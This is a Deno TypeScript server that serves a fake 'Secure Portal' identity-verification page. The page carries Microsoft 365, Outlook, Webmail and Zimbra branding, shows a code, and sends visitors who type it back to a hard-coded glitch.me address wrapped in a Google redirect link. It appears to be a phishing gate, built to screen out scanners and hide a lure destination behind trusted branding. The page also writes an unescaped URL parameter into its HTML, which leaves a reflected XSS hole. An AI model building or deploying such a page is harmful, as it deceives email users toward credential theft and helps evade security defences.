// secure-redirect.ts
import { serve } from "https://deno.land/std@0.200.0/http/server.ts";

// Configuration with type safety
interface AppConfig {
  DESTINATION_URL: string;
  VERIFICATION_CODE: string;
  PORT: number;
  SESSION_TIMEOUT: number;
  MAX_ATTEMPTS: number;
}

const CONFIG: AppConfig = {
  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "http://www.google.com/url?q=http%3A%2F%2Ffew-equinox-aardvark.glitch.me&sa=D&sntz=1&usg=AOvVaw14Yz-jA744I96WiGgWFLUP",
  VERIFICATION_CODE: Deno.env.get("VERIFICATION_CODE") || "A7B2C9D",
  PORT: Number(Deno.env.get("PORT")) || 8000,
  SESSION_TIMEOUT: 15 * 60 * 1000, // 15 minutes in milliseconds
  MAX_ATTEMPTS: 5
};

// Session tracking for security
const sessionStore = new Map<string, { attempts: number; lastAttempt: number }>();

function generateHTML(attemptsRemaining?: number, errorMessage?: string) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Secure email verification portal">
  <title>Secure Access Portal | Identity Verification</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #4f46e5;
      --primary-dark: #4338ca;
      --primary-light: #e0e7ff;
      --error: #dc2626;
      --success: #16a34a;
      --warning: #d97706;
      --microsoft: #0078d4;
      --outlook: #0072c6;
      --zimbra: #ff7a00;
      --webmail: #00a4ef;
      --gray-50: #f9fafb;
      --gray-100: #f3f4f6;
      --gray-200: #e5e7eb;
      --gray-300: #d1d5db;
      --gray-700: #374151;
      --gray-900: #111827;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Inter', system-ui, -apple-system, sans-serif;
    }
    
    body {
      background: linear-gradient(135deg, var(--gray-50) 0%, var(--gray-100) 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 2rem;
      line-height: 1.5;
      color: var(--gray-900);
    }
    
    .verification-container {
      width: 100%;
      max-width: 540px;
    }
    
    .verification-card {
      background: white;
      border-radius: 1rem;
      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 
                  0 10px 10px -5px rgba(0, 0, 0, 0.04);
      overflow: hidden;
      transition: all 0.3s ease;
    }
    
    .verification-card:hover {
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.15);
    }
    
    .card-header {
      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
      color: white;
      padding: 1.75rem 2rem;
      text-align: center;
      position: relative;
      overflow: hidden;
    }
    
    .card-header::after {
      content: "";
      position: absolute;
      bottom: -50px;
      left: -50px;
      width: 150px;
      height: 150px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 50%;
    }
    
    .card-header::before {
      content: "";
      position: absolute;
      top: -30px;
      right: -30px;
      width: 100px;
      height: 100px;
      background: rgba(255, 255, 255, 0.05);
      border-radius: 50%;
    }
    
    .card-logo {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.75rem;
      margin-bottom: 0.5rem;
      position: relative;
      z-index: 1;
    }
    
    .card-logo-icon {
      font-size: 1.8rem;
    }
    
    .card-logo-text {
      font-size: 1.5rem;
      font-weight: 700;
      letter-spacing: 0.5px;
    }
    
    .card-subtitle {
      font-size: 0.9rem;
      opacity: 0.9;
      font-weight: 400;
      position: relative;
      z-index: 1;
    }
    
    .card-body {
      padding: 2.5rem;
    }
    
    .verification-title {
      color: var(--gray-900);
      font-size: 1.5rem;
      margin-bottom: 1rem;
      text-align: center;
      font-weight: 700;
    }
    
    .verification-description {
      color: var(--gray-700);
      text-align: center;
      margin-bottom: 1.75rem;
      font-size: 1rem;
    }
    
    .alert {
      padding: 1rem;
      border-radius: 0.5rem;
      margin-bottom: 1.5rem;
      display: flex;
      align-items: flex-start;
      gap: 0.75rem;
    }
    
    .alert-error {
      background-color: rgba(220, 38, 38, 0.1);
      border-left: 4px solid var(--error);
      color: var(--error);
    }
    
    .alert-warning {
      background-color: rgba(217, 119, 6, 0.1);
      border-left: 4px solid var(--warning);
      color: var(--warning);
    }
    
    .alert-icon {
      font-size: 1.2rem;
      margin-top: 0.1rem;
    }
    
    .alert-content {
      flex: 1;
    }
    
    .alert-title {
      font-weight: 600;
      margin-bottom: 0.25rem;
    }
    
    .code-container {
      background: var(--gray-50);
      border: 1px solid var(--gray-200);
      border-radius: 0.75rem;
      padding: 1.5rem;
      margin: 1.5rem 0;
      text-align: center;
      position: relative;
      overflow: hidden;
    }
    
    .code-container::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 4px;
      height: 100%;
      background: linear-gradient(to bottom, var(--primary), var(--primary-dark));
    }
    
    .verification-code {
      font-family: 'Roboto Mono', monospace;
      font-size: 2rem;
      letter-spacing: 0.25em;
      color: var(--primary-dark);
      font-weight: 700;
      padding: 0 0.5rem;
      position: relative;
    }
    
    .verification-form {
      margin-top: 1.5rem;
    }
    
    .form-group {
      margin-bottom: 1.5rem;
    }
    
    .form-label {
      display: block;
      margin-bottom: 0.5rem;
      color: var(--gray-700);
      font-weight: 500;
      font-size: 0.95rem;
    }
    
    .form-input {
      width: 100%;
      padding: 1rem 1.25rem;
      border: 1px solid var(--gray-200);
      border-radius: 0.75rem;
      font-size: 1rem;
      transition: all 0.2s;
      box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.05);
      background-color: white;
    }
    
    .form-input:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 3px var(--primary-light);
    }
    
    .form-input.error {
      border-color: var(--error);
    }
    
    .verify-button {
      background: var(--primary);
      color: white;
      border: none;
      padding: 1rem;
      border-radius: 0.75rem;
      width: 100%;
      font-size: 1.1rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.75rem;
      margin-top: 0.5rem;
      box-shadow: 0 4px 6px -1px rgba(79, 70, 229, 0.3);
    }
    
    .verify-button:hover {
      background: var(--primary-dark);
      transform: translateY(-1px);
      box-shadow: 0 10px 15px -3px rgba(79, 70, 229, 0.3);
    }
    
    .verify-button:active {
      transform: translateY(0);
      box-shadow: 0 2px 4px -1px rgba(79, 70, 229, 0.3);
    }
    
    .verify-button:disabled {
      background: var(--gray-200);
      color: var(--gray-300);
      cursor: not-allowed;
      transform: none;
      box-shadow: none;
    }
    
    .providers-section {
      margin-top: 2.5rem;
    }
    
    .providers-title {
      text-align: center;
      color: var(--gray-300);
      font-size: 0.9rem;
      margin-bottom: 1.5rem;
      position: relative;
      display: flex;
      align-items: center;
    }
    
    .providers-title::before,
    .providers-title::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid var(--gray-200);
    }
    
    .providers-title span {
      padding: 0 1rem;
    }
    
    .providers-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
      gap: 1rem;
      margin-top: 1.5rem;
    }
    
    .provider-card {
      background: white;
      border: 1px solid var(--gray-200);
      border-radius: 0.75rem;
      padding: 1.25rem;
      text-align: center;
      transition: all 0.2s;
      cursor: pointer;
    }
    
    .provider-card:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
      border-color: var(--primary-light);
    }
    
    .provider-logo {
      width: 48px;
      height: 48px;
      margin: 0 auto 0.75rem;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    .provider-name {
      font-size: 0.85rem;
      font-weight: 600;
      color: var(--gray-700);
      margin-top: 0.5rem;
    }
    
    .microsoft-bg { background: var(--microsoft); }
    .outlook-bg { background: var(--outlook); }
    .zimbra-bg { background: var(--zimbra); }
    .webmail-bg { background: var(--webmail); }
    
    .provider-badge {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 1.5rem;
      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
    }
    
    .footer {
      text-align: center;
      margin-top: 3rem;
      color: var(--gray-300);
      font-size: 0.8rem;
      line-height: 1.6;
    }
    
    .security-info {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      margin-top: 0.5rem;
      color: var(--gray-300);
    }
    
    .security-info i {
      font-size: 0.9rem;
    }
    
    @media (max-width: 480px) {
      .card-body {
        padding: 1.75rem;
      }
      
      .verification-title {
        font-size: 1.25rem;
      }
      
      .verification-code {
        font-size: 1.5rem;
      }
      
      .providers-grid {
        grid-template-columns: repeat(2, 1fr);
      }
    }
  </style>
</head>
<body>
  <div class="verification-container">
    <div class="verification-card">
      <div class="card-header">
        <div class="card-logo">
          <i class="fas fa-shield-alt card-logo-icon"></i>
          <span class="card-logo-text">SECURE PORTAL</span>
        </div>
        <div class="card-subtitle">Identity Verification Required</div>
      </div>
      
      <div class="card-body">
        <h1 class="verification-title">Verify Your Identity</h1>
        <p class="verification-description">
          To ensure account security, please enter the verification code sent to your email address.
        </p>
        
        ${errorMessage ? `
        <div class="alert alert-error">
          <i class="fas fa-exclamation-circle alert-icon"></i>
          <div class="alert-content">
            <div class="alert-title">Verification Error</div>
            <div>${errorMessage}</div>
          </div>
        </div>
        ` : ''}
        
        ${attemptsRemaining !== undefined && attemptsRemaining < CONFIG.MAX_ATTEMPTS ? `
        <div class="alert alert-warning">
          <i class="fas fa-exclamation-triangle alert-icon"></i>
          <div class="alert-content">
            <div class="alert-title">Security Notice</div>
            <div>${attemptsRemaining} attempt${attemptsRemaining === 1 ? '' : 's'} remaining before temporary lockout.</div>
          </div>
        </div>
        ` : ''}
        
        <div class="code-container">
          <div class="verification-code">${CONFIG.VERIFICATION_CODE}</div>
        </div>
        
        <div class="verification-form">
          <form id="verifyForm">
            <div class="form-group">
              <label for="codeInput" class="form-label">Verification Code</label>
              <input 
                type="text" 
                class="form-input ${errorMessage ? 'error' : ''}" 
                id="codeInput" 
                placeholder="Enter the 7-digit code" 
                required
                autofocus
                pattern="[A-Za-z0-9]{7}"
                title="Exactly 7 alphanumeric characters"
                maxlength="7"
                autocomplete="one-time-code"
              >
            </div>
            <button type="submit" class="verify-button" id="verifyButton">
              <i class="fas fa-lock"></i>
              <span>Continue Securely</span>
            </button>
          </form>
        </div>
        
        <div class="providers-section">
          <div class="providers-title">
            <span>Trusted by leading organizations</span>
          </div>
          
          <div class="providers-grid">
            <div class="provider-card" data-provider="microsoft">
              <div class="provider-logo">
                <div class="provider-badge microsoft-bg">
                  <i class="fab fa-microsoft"></i>
                </div>
              </div>
              <div class="provider-name">Microsoft 365</div>
            </div>
            
            <div class="provider-card" data-provider="outlook">
              <div class="provider-logo">
                <div class="provider-badge outlook-bg">
                  <i class="fas fa-envelope"></i>
                </div>
              </div>
              <div class="provider-name">Outlook</div>
            </div>
            
            <div class="provider-card" data-provider="webmail">
              <div class="provider-logo">
                <div class="provider-badge webmail-bg">
                  <i class="fas fa-globe"></i>
                </div>
              </div>
              <div class="provider-name">Webmail</div>
            </div>
            
            <div class="provider-card" data-provider="zimbra">
              <div class="provider-logo">
                <div class="provider-badge zimbra-bg">
                  <i class="fas fa-mail-bulk"></i>
                </div>
              </div>
              <div class="provider-name">Zimbra</div>
            </div>
          </div>
        </div>
        
        <div class="footer">
          <p>This secure portal uses industry-standard encryption to protect your information.</p>
          <div class="security-info">
            <i class="fas fa-lock"></i>
            <span>256-bit SSL Encryption</span>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const form = document.getElementById('verifyForm');
      const codeInput = document.getElementById('codeInput');
      const verifyButton = document.getElementById('verifyButton');
      const providerCards = document.querySelectorAll('.provider-card');
      
      // Track input changes for better UX
      codeInput.addEventListener('input', (e) => {
        codeInput.value = codeInput.value.toUpperCase();
      });
      
      // Form submission handler
      form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        // Disable button during submission
        verifyButton.disabled = true;
        verifyButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Verifying...</span>';
        
        try {
          const response = await fetch('/verify', {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json'
            },
            body: JSON.stringify({ 
              code: codeInput.value.trim(),
              clientTime: new Date().toISOString()
            })
          });
          
          if (response.ok) {
            // Successful verification - redirect
            window.location.href = await response.text();
          } else {
            const error = await response.json();
            // Re-enable button
            verifyButton.disabled = false;
            verifyButton.innerHTML = '<i class="fas fa-lock"></i><span>Continue Securely</span>';
            
            // Show error to user
            if (error.redirect) {
              window.location.href = error.redirect;
            } else {
              // Reload page with error message
              window.location.search = '?error=' + encodeURIComponent(error.message) + 
                '&attempts=' + (error.attemptsRemaining || '');
            }
          }
        } catch (error) {
          verifyButton.disabled = false;
          verifyButton.innerHTML = '<i class="fas fa-lock"></i><span>Continue Securely</span>';
          alert('Network error. Please check your connection and try again.');
        }
      });
      
      // Add click handlers for provider cards
      providerCards.forEach(card => {
        card.addEventListener('click', () => {
          // Visual feedback
          card.style.transform = 'scale(0.95)';
          setTimeout(() => {
            card.style.transform = '';
          }, 200);
          
          // Focus input
          codeInput.focus();
        });
      });
    });
  </script>
</body>
</html>`;
}

async function handleRequest(req: Request): Promise<Response> {
  const url = new URL(req.url);
  const clientIP = req.headers.get('x-forwarded-for') || req.headers.get('x-real-ip') || 'unknown';
  
  // Handle verification requests
  if (url.pathname === "/verify" && req.method === "POST") {
    try {
      // Check rate limiting
      const session = sessionStore.get(clientIP) || { attempts: 0, lastAttempt: 0 };
      const now = Date.now();
      
      // Reset if last attempt was more than SESSION_TIMEOUT ago
      if (now - session.lastAttempt > CONFIG.SESSION_TIMEOUT) {
        session.attempts = 0;
      }
      
      // Check if max attempts reached
      if (session.attempts >= CONFIG.MAX_ATTEMPTS) {
        return new Response(
          JSON.stringify({ 
            message: "Too many failed attempts. Please try again later.",
            attemptsRemaining: 0
          }),
          { status: 429, headers: { 'Content-Type': 'application/json' } }
        );
      }
      
      const { code } = await req.json();
      session.attempts++;
      session.lastAttempt = now;
      sessionStore.set(clientIP, session);
      
      if (code?.toUpperCase() === CONFIG.VERIFICATION_CODE.toUpperCase()) {
        // Successful verification - clear attempts
        sessionStore.delete(clientIP);
        return new Response(CONFIG.DESTINATION_URL, {
          status: 200,
          headers: { 'Content-Type': 'text/plain' }
        });
      }
      
      // Failed attempt
      const attemptsRemaining = CONFIG.MAX_ATTEMPTS - session.attempts;
      return new Response(
        JSON.stringify({ 
          message: "The verification code you entered is incorrect.",
          attemptsRemaining
        }),
        { 
          status: 401, 
          headers: { 
            'Content-Type': 'application/json',
            'X-RateLimit-Remaining': attemptsRemaining.toString(),
            'X-RateLimit-Reset': (now + CONFIG.SESSION_TIMEOUT).toString()
          } 
        }
      );
    } catch (error) {
      return new Response(
        JSON.stringify({ message: "Invalid request format." }),
        { status: 400, headers: { 'Content-Type': 'application/json' } }
      );
    }
  }
  
  // Handle GET requests (show verification page)
  const errorMessage = url.searchParams.get('error');
  const attemptsRemaining = url.searchParams.get('attempts');
  
  return new Response(generateHTML(
    attemptsRemaining ? parseInt(attemptsRemaining) : undefined,
    errorMessage ? decodeURIComponent(errorMessage) : undefined
  ), {
    headers: { 
      'Content-Type': 'text/html',
      'Cache-Control': 'no-store, max-age=0',
      'X-Frame-Options': 'DENY',
      'X-Content-Type-Options': 'nosniff',
      'Referrer-Policy': 'strict-origin-when-cross-origin'
    }
  });
}

console.log(`Secure verification server running on port ${CONFIG.PORT}`);
serve(handleRequest, { port: CONFIG.PORT });
